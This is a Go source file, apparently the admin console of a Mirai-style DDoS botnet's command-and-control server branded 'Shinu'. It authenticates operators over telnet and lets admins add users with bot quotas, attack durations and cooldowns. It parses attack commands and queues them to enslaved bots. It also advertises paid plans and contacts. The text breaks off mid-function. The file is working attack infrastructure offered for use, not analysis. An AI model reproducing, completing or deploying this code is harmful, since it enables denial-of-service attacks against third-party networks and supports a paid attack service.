package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second)) 
    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\x1b[1;32m                                       \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m              ▀██▀ ▄███▄ ▀██ ██▀██▀▀█  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m               ██ ███ ███ ██ ██ ██▄█   \r\n"))
    this.conn.Write([]byte("\r\x1b[0;32m               ██ ▀██▄██▀ ▀█▄█▀ ██▀█   \r\n"))
    this.conn.Write([]byte("\r\x1b[0;32m              ▄██▄▄█▀▀▀     ▀  ▄██▄▄█  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                                       \r\n"))
	this.conn.Write([]byte("\r\x1b[0;35m                                       \r\n"))
	this.conn.Write([]byte("\r\x1b[1;37m                                       \r\n"))
    this.conn.Write([]byte("\r\x1b[0;35mユーザー名: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\r\x1b[1;31m                             \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ███████\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗  \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗\x1b[1;37m███\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗ \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m████\x1b[0;35m╗  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ███████\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔\x1b[1;37m██\x1b[0;35m╗ \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
    this.conn.Write([]byte("\r\x1b[1;35m                    ╚════\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║╚\x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ███████\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║ ╚\x1b[1;37m████\x1b[0;35m║╚\x1b[1;37m██████\x1b[0;35m╔╝ \r\n"))            
    this.conn.Write([]byte("\r\x1b[0;35m                    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \r\n"))
    this.conn.Write([]byte("\r\x1b[1;35m                     - Shinu Created by \x1b[1;37mBeamcat \x1b[1;35m& \x1b[1;37mAjax \x1b[1;35m- \r\n")) 
    this.conn.Write([]byte("\033[0;35mパスワード: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
	    this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write(append([]byte("\r\033[1;35m死ぬ Checking data input... 死ぬ\033[35m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
		this.conn.Write([]byte("\r\x1b[1;35m HI \r\n"))
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\x1b[0;32m                             \r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m██████\x1b[0;35m╗\r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m╗\r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m█████\x1b[0;35m╗  \x1b[1;37m██████\x1b[0;35m╔╝\r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║╚════\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔══╝  \x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m╗\r\n"))
        this.conn.Write([]byte("\r\x1b[0;35m                     ╚\x1b[1;37m██████\x1b[0;35m╔╝\x1b[1;37m███████\x1b[0;35m║\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\r\n"))
        this.conn.Write([]byte("\r\x1b[0;35m                      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝                                       \r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m \r\n"))
		this.conn.Write([]byte("\r\x1b[1;37m             ██\x1b[0;31m╗\x1b[1;37m███\x1b[0;31m╗   \x1b[1;37m██\x1b[0;31m╗\x1b[1;37m██\x1b[0;31m╗   \x1b[1;37m██\x1b[0;31m╗ \x1b[1;37m█████\x1b[0;31m╗ \x1b[1;37m██\x1b[0;31m╗     \x1b[1;37m██\x1b[0;31m╗\x1b[1;37m██████\x1b[0;31m╗ \r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m             ██\x1b[0;31m║\x1b[1;37m████\x1b[0;31m╗  \x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║   \x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m╔══\x1b[1;37m██\x1b[0;31m╗\x1b[1;37m██\x1b[0;31m║     \x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m╔══\x1b[1;37m██\x1b[0;31m╗\r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m             ██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m╔\x1b[1;37m██\x1b[0;31m╗ \x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║   \x1b[1;37m██\x1b[0;31m║\x1b[1;37m███████\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║     \x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║  \x1b[1;37m██\x1b[0;31m║\r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m             ██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║╚\x1b[1;37m██\x1b[0;31m╗\x1b[1;37m██\x1b[0;31m║╚\x1b[1;37m██\x1b[0;31m╗ \x1b[1;37m██\x1b[0;31m╔╝\x1b[1;37m██\x1b[0;31m╔══\x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║     \x1b[1;37m██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║  \x1b[1;37m██\x1b[0;31m║\r\n"))
        this.conn.Write([]byte("\r\x1b[1;37m             ██\x1b[0;31m║\x1b[1;37m██\x1b[0;31m║ ╚\x1b[1;37m████\x1b[0;31m║ ╚\x1b[1;37m████\x1b[0;31m╔╝ \x1b[1;37m██\x1b[0;31m║  \x1b[1;37m██\x1b[0;31m║\x1b[1;37m███████\x1b[0;31m╗\x1b[1;37m██\x1b[0;31m║\x1b[1;37m██████\x1b[0;31m╔╝\r\n"))
        this.conn.Write([]byte("\r\x1b[0;31m             ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝\r\n"))
        this.conn.Write([]byte("\r\x1b[1;35m                   PURCHASE A PLAN? - \x1b[1;37mdiscord.gg/4Mr3h6y\r\n"))   
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;[%d] Hearts Broken | Login as: [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[0;32m                             \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m██████\x1b[0;35m╗\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m╗\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m█████\x1b[0;35m╗  \x1b[1;37m██████\x1b[0;35m╔╝\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                     ██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║╚════\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔══╝  \x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m╗\r\n"))
    this.conn.Write([]byte("\r\x1b[0;35m                     ╚\x1b[1;37m██████\x1b[0;35m╔╝\x1b[1;37m███████\x1b[0;35m║\x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\r\n"))
    this.conn.Write([]byte("\r\x1b[0;35m                      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝                                       \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ██\x1b[1;32m╗   \x1b[1;37m██\x1b[1;32m╗ \x1b[1;37m█████\x1b[1;32m╗ \x1b[1;37m██\x1b[1;32m╗     \x1b[1;37m██\x1b[1;32m╗\x1b[1;37m██████\x1b[1;32m╗ \r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ██\x1b[1;32m║   \x1b[1;37m██\x1b[1;32m║\x1b[1;37m██\x1b[1;32m╔══\x1b[1;37m██\x1b[1;32m╗\x1b[1;37m██\x1b[1;32m║     \x1b[1;37m██\x1b[1;32m║\x1b[1;37m██\x1b[1;32m╔══\x1b[1;37m██\x1b[1;32m╗\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37m                    ██\x1b[1;32m║   \x1b[1;37m██\x1b[1;32m║\x1b[1;37m███████\x1b[1;32m║\x1b[1;37m██\x1b[1;32m║     \x1b[1;37m██\x1b[1;32m║\x1b[1;37m██\x1b[1;32m║  \x1b[1;37m██\x1b[1;32m║\r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m                    ╚\x1b[1;37m██\x1b[1;32m╗ \x1b[1;37m██\x1b[1;32m╔╝\x1b[1;37m██\x1b[1;32m╔══\x1b[1;37m██\x1b[1;32m║\x1b[1;37m██\x1b[1;32m║     \x1b[1;37m██\x1b[1;32m║\x1b[1;37m██\x1b[1;32m║  \x1b[1;37m██\x1b[1;32m║\r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m                     ╚\x1b[1;37m████\x1b[1;32m╔╝ \x1b[1;37m██\x1b[1;32m║  \x1b[1;37m██\x1b[1;32m║\x1b[1;37m███████\x1b[1;32m╗\x1b[1;37m██\x1b[1;32m║\x1b[1;37m██████\x1b[1;32m╔╝\r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m                      ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ \r\n"))
	this.conn.Write([]byte("\r\x1b[1;35m                        PRESS \x1b[1;37mENTER \x1b[1;35mTO CONTINUE...\r\n"))
	for {                              
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\r\x1b[1;35m" + username + "\x1b[1;37m@\x1b[1;35mLove\x1b[1;37m愛\033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "@" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "Clear" || cmd == "clear" || cmd == "CLS" || cmd == "Cls" || cmd == "cls" || cmd == "" {
		botCount = clientList.Count()
			this.conn.Write([]byte(fmt.Sprintf("\033[2J\033[1;1H")))                                       		                         
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m                               ▄▄▄▄▄▄     ▄▄▄▄▄▄                                \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m    [+] Build v 1.0 [+]      ▄█▓▓▓▓▓▓█▄ ▄█▓▓▓▓▓▓█▄    Logged in as: " + username + "\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m     By Beamcat & Ajax      ▐█▓▓▒▒▒▒▒▓▓█▓▓▒▒▒▒▒▓▓█▌   Bots loaded: %d                         \r\n", botCount)))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m════════════════════════════█▓▓▒▒░░░░░░░░░░░░░▒▒▓▓█════════════════════════════ \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;31m  ▀██▀ ▄███▄ ▀██ ██▀██▀▀█   █▓▓▒▒░░░░░░░░░░░░░▒▒▓▓█   Available command list:   \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;31m   ██ ███ ███ ██ ██ ██▄█    ▐█▓▓▒▒░░░░░░░░░░░▒▒▓▓█▌---------------------------- \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m   ██ ▀██▄██▀ ▀█▄█▀ ██▀█     ▀█▓▓▒▒░░░░░░░░░▒▒▓▓█▀    HELP     [+]     VPN      \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m  ▄██▄▄█▀▀▀     ▀  ▄██▄▄█      ▀█▓▓▒▒░░░░░▒▒▓▓█▀     CONTACT   [+]    RULES     \r\n")))                                                             
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m═════════════════════════════════▀█▓▓▒▒░▒▒▓▓█▀═════════════════════════════════ \r\n")))                     
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m                                  ▀█▓▓▒░▒▓▓█▀                                   \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m                                    ▀█▓░▓█▀                                     \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m                                      ▀█▀			                            \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0m")))
            continue
        }
		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "H" || cmd == "Help" || cmd == "hel" || cmd == "h" {	
		botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[2J\033[1;1H")))                                      		                         
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m                               ▄▄▄▄▄▄     ▄▄▄▄▄▄                                \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m    [+] Build v 1.0 [+]      ▄█▓▓▓▓▓▓█▄ ▄█▓▓▓▓▓▓█▄    Logged in as: " + username + "\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m     By Beamcat & Ajax      ▐█▓▓▒▒▒▒▒▓▓█▓▓▒▒▒▒▒▓▓█▌   Bots loaded: %d                          \r\n", botCount)))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;37m════════════════════════════█▓▓▒▒░░░░░░░░░░░░░▒▒▓▓█════════════════════════════ \r\n")))  
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;31m  ▀██▀ ▄███▄ ▀██ ██▀██▀▀█   █▓▓▒▒░░░░░░░░░░░░░▒▒▓▓█   Available command list:   \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[1;31m   ██ ███ ███ ██ ██ ██▄█    ▐█▓▓▒▒░░░░░░░░░░░▒▒▓▓█▌---------------------------- \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m   ██ ▀██▄██▀ ▀█▄█▀ ██▀█     ▀█▓▓▒▒░░░░░░░░░▒▒▓▓█▀    HELP     [+]     VPN      \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m  ▄██▄▄█▀▀▀     ▀  ▄██▄▄█      ▀█▓▓▒▒░░░░░▒▒▓▓█▀     CONTACT   [+]    RULES     \r\n")))                                                              
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m═════════════════════════════════▀█▓▓▒▒░▒▒▓▓█▀═════════════════════════════════ \r\n")))                      
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m                                  ▀█▓▓▒░▒▓▓█▀                                   \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m                                    ▀█▓░▓█▀                                     \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\r\x1b[0;31m                                      ▀█▀			                            \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0m")))
            continue
		}
				if err != nil || cmd == "VPN" || cmd == "vpn" || cmd == "VPNS" || cmd == "vpns" || cmd == "v"  {	
            this.conn.Write([]byte("\r\x1b[1;35m Welcome back to the Shinu console \x1b[1;37m" + username + "\x1b[1;35m 死ぬ \r\n"))
            this.conn.Write([]byte("\r\x1b[0;35m═══════════════════════════════════════════════════════════════════════════════ \r\n"))
			this.conn.Write([]byte("\r\x1b[1;37m     DDoS Protected VPNs by OVH:        \x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗  \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗\x1b[1;37m███\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗ \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m                                        \x1b[1;37m██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m████\x1b[0;35m╗  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m   USA.VIRGINIA            $7 | £5      \x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔\x1b[1;37m██\x1b[0;35m╗ \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
			this.conn.Write([]byte("\r\x1b[1;37m   CANADA.MONTREAL (DEDI) $12 | £9      \x1b[0;35m╚════\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║╚\x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m   FRANCE.STRASBOURG       $7 | £5      \x1b[1;37m███████\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║ ╚\x1b[1;37m████\x1b[0;35m║╚\x1b[1;37m██████\x1b[0;35m╔╝ \r\n"))            
            this.conn.Write([]byte("\r\x1b[0;35m════════════════════╦═══════════════════╬═════════╩══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╩══  \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m      ( VPN's )     \x1b[0;35m║      Contact      ║\x1b[1;37mType \x1b[1;37mhelp \x1b[0;35mif you're unsure of commands                    \r\n"))
            this.conn.Write([]byte("\r\x1b[0;35m════════════════════╩═══════════════════╩══════════════════════════════════════  \r\n"))
            continue
        }
				if err != nil || cmd == "c" || cmd == "ct" || cmd == "CT" || cmd == "Ct" || cmd == "contact"  {	
            this.conn.Write([]byte("\r\x1b[1;35m Welcome back to the Shinu console \x1b[1;37m" + username + "\x1b[1;35m 死ぬ \r\n"))
            this.conn.Write([]byte("\r\x1b[0;35m═══════════════════════════════════════════════════════════════════════════════ \r\n"))
			this.conn.Write([]byte("\r\x1b[1;37m                                        \x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗  \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗\x1b[1;37m███\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m╗   \x1b[1;37m██\x1b[0;35m╗ \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m           discord.gg/4Mr3h6y           \x1b[1;37m██\x1b[0;35m╔════╝\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m████\x1b[0;35m╗  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m             beamkitty#0743             \x1b[1;37m███████\x1b[0;35m╗\x1b[1;37m███████\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔\x1b[1;37m██\x1b[0;35m╗ \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
			this.conn.Write([]byte("\r\x1b[1;37m               Ajax#1223                \x1b[0;35m╚════\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m╔══\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║╚\x1b[1;37m██\x1b[0;35m╗\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║   \x1b[1;37m██\x1b[0;35m║ \r\n"))
            this.conn.Write([]byte("\r\x1b[1;37m                                        \x1b[1;37m███████\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║  \x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║\x1b[1;37m██\x1b[0;35m║ ╚\x1b[1;37m████\x1b[0;35m║╚\x1b[1;37m██████\x1b[0;35m╔╝ \r\n"))            
            this.conn.Write([]byte("\r\x1b[0;35m════════════════════╦═══════════════════╬═════════╩══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╩══  \r\n"))
            this.conn.Write([]byte("\r\x1b[0;35m        VPN's       ║    \x1b[1;37m( Contact )    \x1b[0;35m║\x1b[1;37mType \x1b[1;37mhelp \x1b[0;35mif you're unsure of commands                    \r\n"))
            this.conn.Write([]byte("\r\x1b[0;35m════════════════════╩═══════════════════╩══════════════════════════════════════  \r\n"))
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[0;35mEnter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0;35mEnter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0;35mEnter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "\x1b[0;35mFailed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;35mMax attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "\x1b[0;35mFailed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;35mCooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "\x1b[0;35mFailed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;35mNew account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "botcount" || userInfo.admin == 1 && cmd == "bots" || userInfo.admin == 1 && cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
			    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;35m[\x1b[0;35m+\x1b[1;35m]----------------\x1b[1;35m[\x1b[0;35m+\x1b[1;35m]\r\n")))
				for k, v := range m{
				
                this.conn.Write([]byte(fmt.Sprintf("\033[1;35m%s:\t\033[1;30m[\033[1;36m%d\033[1;30m]\033[0m\r\n", k, v)))
				}
          
			this.conn.Write([]byte(fmt.Sprintf("\033[32;1mTOTAL: %d\r\n", botCount)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;35m[\x1b[0;35m+\x1b[1;35m]----------------\x1b[1;35m[\x1b[0;35m+\x1b[1;35m]\r\n")))
            continue
			
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
